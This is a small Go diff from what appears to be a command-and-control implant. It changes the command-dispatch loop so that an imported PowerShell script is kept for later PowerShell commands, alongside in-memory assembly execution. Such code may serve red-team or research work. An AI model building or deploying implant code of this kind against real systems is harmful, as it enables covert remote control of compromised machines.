@@ -208,6 +208,7 @@ func main() {
 							result, err = services.CmdExecuteAssemblyX86(cmdBuf)
 						case packet.CMD_TYPE_IMPORT_POWERSHELL:
 							result, err = services.CmdImportPowershell(cmdBuf)
+							powershellImport = result
 							callbackType = 0
 						case packet.CMD_TYPE_POWERSHELL_PORT:
 							result, err = services.CmdPowershellPort(cmdBuf, powershellImport)
